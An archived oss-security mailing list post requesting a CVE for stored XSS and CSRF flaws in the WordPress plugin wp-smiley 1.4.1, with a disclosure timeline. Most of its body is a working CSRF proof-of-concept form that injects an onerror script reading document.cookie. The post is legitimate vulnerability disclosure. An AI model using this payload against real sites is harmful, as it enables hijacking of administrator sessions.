@@ -1,0 +1,277 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - CVE request: XSS and CSRF in WP Smiley plugin for WordPress</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="../../../2015/05/28/3">[&lt;prev]</a> <a href="2">[next&gt;]</a> <a href="../../../2015/05/31/2">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;20150529114001.GB739&#64;nixu.com&gt;
+Date: Fri, 29 May 2015 14:40:01 +0300
+From: Henri Salo &lt;Henri.Salo&#64;...u.com&gt;
+To: &lt;oss-security&#64;...ts.openwall.com&gt;
+CC: &lt;cve-assign&#64;...re.org&gt;, &lt;joni.hauhia&#64;...u.com&gt;
+Subject: CVE request: XSS and CSRF in WP Smiley plugin for WordPress
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+We found following vulnerabilities with Joni Hauhia. Could you assign CVE for
+these issues, thanks.
+
+Product: WordPress plugin wp-smiley
+Plugin page: <a href="https://wordpress.org/plugins/wp-smiley/" rel="nofollow">https://wordpress.org/plugins/wp-smiley/</a>
+Developer: As247 (no contact information available)
+Vulnerability Type:
+  CWE-79: Cross-site scripting
+  CWE-352: Cross-Site Request Forgery
+Vulnerable Versions: 1.4.1
+Fixed Version: N/A
+Solution Status: N/A
+Vendor Notification: 2015-03-24
+Public Disclosure: 2015-05-29
+
+Vulnerability details:
+
+WP Smiley plugin for WordPress contains a flaw that allows a stored
+cross-site-scripting (XSS) attack. This flaw exists because the smilies4wp.php
+script does not validate input properly before returning it to users. This
+allows an authenticated remote attacker to create a specially crafted request
+that would execute arbitrary script code in a user's browser session within the
+trust relationship between their browser and the server.
+
+Editor-level user account can use this cross-site scripting vulnerability
+against Administrator-level users.
+
+Root cause:
+
+The software incorrectly sanitizes user-controllable input before it is placed
+in output that is used as a web page that is served to users.
+
+Proof-of-concept:
+
+This vulnerability can be demonstrated with following cross-site request forgery
+PoC below.
+
+Notes:
+
+Other parameters are also possibly insecure (not tested). Other versions not
+tested.
+
+References:
+
+Cross-site Scripting:
+    <a href="http://cwe.mitre.org/data/definitions/79.html" rel="nofollow">http://cwe.mitre.org/data/definitions/79.html</a>
+    <a href="https://scapsync.com/cwe/CWE-79" rel="nofollow">https://scapsync.com/cwe/CWE-79</a>
+    <a href="https://en.wikipedia.org/wiki/Cross-site_scripting" rel="nofollow">https://en.wikipedia.org/wiki/Cross-site_scripting</a>
+
+Cross-Site Request Forgery:
+    <a href="http://cwe.mitre.org/data/definitions/352.html" rel="nofollow">http://cwe.mitre.org/data/definitions/352.html</a>
+    <a href="https://scapsync.com/cwe/CWE-352" rel="nofollow">https://scapsync.com/cwe/CWE-352</a>
+    <a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery" rel="nofollow">https://en.wikipedia.org/wiki/Cross-site_request_forgery</a>
+
+Timeline:
+
+2015-03-24: Notification about vulnerability for WordPress plugins team
+2015-03-24: CVE request from MITRE (no response)
+2015-03-25: WordPress plugins team responds and disables plugin from archive
+2015-04-10: Sent emails to sites, which I knew using this plugin
+2015-04-15: Asked status of CVE from MITRE (no response)
+2015-05-29: Public disclosure
+
+CSRF XSS PoC:
+
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;form action="<a href="https://example.com/wp-admin/options-general.php?page=smilies4wp.php" rel="nofollow">https://example.com/wp-admin/options-general.php?page=smilies4wp.php</a>" method="POST"&gt;
+      &lt;input type="hidden" name="s4w&amp;#45;disp" value="&amp;quot;&amp;gt;" /&gt;
+      &lt;input type="hidden" name="s4w&amp;#45;cfid" value="comment" /&gt;
+      &lt;input type="hidden" name="s4w&amp;#45;more" value="More&amp;gt;&amp;gt;&amp;quot;&amp;gt;&amp;lt;img&amp;#32;src&amp;#61;&amp;apos;&amp;#35;&amp;apos;&amp;#32;onerror&amp;#61;alert&amp;#40;document&amp;#46;cookie&amp;#41;&amp;#32;&amp;#47;&amp;gt;" /&gt;
+      &lt;input type="hidden" name="s4w&amp;#45;less" value="Less&amp;lt;&amp;lt;" /&gt;
+      &lt;input type="hidden" name="s4w&amp;#45;cp" value="1" /&gt;
+      &lt;input type="hidden" name="s4w&amp;#45;cc" value="1" /&gt;
+      &lt;input type="hidden" name="s4w&amp;#45;cfa" value="1" /&gt;
+      &lt;input type="hidden" name="s4w&amp;#45;update" value="Update&amp;#32;�&amp;#187;" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;evil&amp;#124;gif&amp;#91;&amp;#93;" value="&amp;#58;&amp;#41;" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;evil&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;surprised&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;surprised&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;question&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;question&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;mad&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;mad&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;confused&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;confused&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;twisted&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;twisted&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;neutral&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;neutral&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;mrgreen&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;mrgreen&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;redface&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;redface&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;razz&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;razz&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;smile&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;smile&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;cool&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;cool&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;exclaim&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;exclaim&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;lol&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;lol&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;wink&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;wink&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;cry&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;cry&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;biggrin&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;biggrin&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;idea&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;idea&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;rolleyes&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;rolleyes&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;eek&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;eek&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;arrow&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;arrow&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="icon&amp;#95;sad&amp;#124;gif&amp;#91;&amp;#93;" value="" /&gt;
+      &lt;input type="hidden" name="s4w&amp;#45;style" value="&amp;#9;&amp;#46;s4w&amp;#45;smilies&amp;#32;&amp;#123;&amp;#13;&amp;#10;&amp;#9;text&amp;#45;align&amp;#58;&amp;#32;center&amp;#59;&amp;#13;&amp;#10;&amp;#9;position&amp;#58;relative&amp;#59;&amp;#13;&amp;#10;&amp;#9;height&amp;#58;0px&amp;#59;&amp;#13;&amp;#10;&amp;#125;&amp;#13;&amp;#10;&amp;#46;s4w&amp;#45;smilies&amp;#45;content&amp;#32;&amp;#123;&amp;#13;&amp;#10;&amp;#9;width&amp;#58;&amp;#32;300px&amp;#59;&amp;#13;&amp;#10;&amp;#9;padding&amp;#58;&amp;#32;3px&amp;#59;&amp;#13;&amp;#10;&amp;#9;line&amp;#45;height&amp;#58;&amp;#32;120&amp;#37;&amp;#59;&amp;#13;&amp;#10;&amp;#9;position&amp;#58;absolute&amp;#59;&amp;#13;&amp;#10;&amp;#9;border&amp;#58;&amp;#32;1px&amp;#32;solid&amp;#32;&amp;#35;BFCAD2&amp;#59;&amp;#13;&amp;#10;&amp;#9;background&amp;#58;&amp;#35;fff&amp;#59;&amp;#13;&amp;#10;&amp;#9;left&amp;#58;160px&amp;#59;&amp;#13;&amp;#10;&amp;#9;top&amp;#58;&amp;#45;10px&amp;#59;&amp;#13;&amp;#10;&amp;#9;&amp;#13;&amp;#10;&amp;#125;&amp;#13;&amp;#10;&amp;#46;wp&amp;#45;smiley&amp;#45;button&amp;#32;&amp;#123;&amp;#13;&amp;#10;border&amp;#58;&amp;#32;1px&amp;#32;solid&amp;#32;&amp;#35;ccc&amp;#59;&amp;#13;&amp;#10;margin&amp;#58;&amp;#32;1px&amp;#59;&amp;#13;&amp;#10;padding&amp;#58;&amp;#32;2px&amp;#59;&amp;#13;&amp;#10;&amp;#125;&amp;#13;&amp;#10;&amp;#46;wp&amp;#45;smiley&amp;#45;button&amp;#58;hover&amp;#32;&amp;#123;&amp;#13;&amp;#10;cursor&amp;#58;pointer&amp;#59;&amp;#13;&amp;#10;filter&amp;#58;progid&amp;#58;DXImageTransform&amp;#46;Microsoft&amp;#46;Alpha&amp;#40;opacity&amp;#61;60&amp;#41;&amp;#59;&amp;#13;&amp;#10;&amp;#45;moz&amp;#45;opacity&amp;#58;&amp;#32;0&amp;#46;6&amp;#59;&amp;#13;&amp;#10;&amp;#125;" /&gt;
+      &lt;input type="submit" value="Submit request" /&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+- -- 
+Henri Salo
+Security Specialist, Nixu Oy
+Mobile: +358 40 770 5733
+PL 39 FIN (Keilaranta 15)
+FIN-02151 Espoo, Finland
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBAgAGBQJVaFARAAoJEHu3+uinl6paKbkP/0/77ILgY2/T+nybAinYTSy+
+JWs76w2UL9lyh1lRo3g+CE7RfTj56RB6tObZ6phMahgZKo/w6sVllk0L/MS8G1QR
+pHaTsTnpAR0rqFE8fqzPQ4QsQ0Zv1Exn+FVXke6qF0RzGVdXwVoiZseTg2wAxOWg
+zqvlAPGd2dQvvTmmUIBj8QTfNw8Z1jJhxNdVQ5fhg5fNPjcRzBO5pfeIeLu6yrvs
+717ATOsInJ19iZKVw6IrId12XBvKmX3VDX2HJMY0vwFUSmdEUSNUsgOV6QsAHu+I
+EffEUJYDPIuC4zaEo7dT4OwwzjE8YPQ87xUW1cXMEWf8619PRj0GQ0fQuQ+q/Zl4
+A6RmayvvGLSu4ogsbb5HFJubCdFuRR0y3HXMXbVCQZdeRzDjgJAiFjpS0zRG8W/q
+Hwpco++dSJowSvyiouk9SZA0Zf9t69Ro4nIYUgMrn+BfZFII7YIlFfuWXD2qpPsE
+mxlsCkwFAta2I4fZXDtl0QJqwqghs4PexeMqFhCfN3BeXLeItZuON9cL0X6av+oZ
+O3P5qt4D0lb22t/Onj0VDx/wkK8ZQOifMdluHGLb7HOnoIpELlpfYwo+b4NaoDIh
+oIGDm97IGyDByejNBQ97XNCvQoy42WNhpAeCqIW6eXcMYssO0r4uhZmAvSbzWASZ
+yrT8K8gJgUBnXwS0XP10
+=chYh
+-----END PGP SIGNATURE-----
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
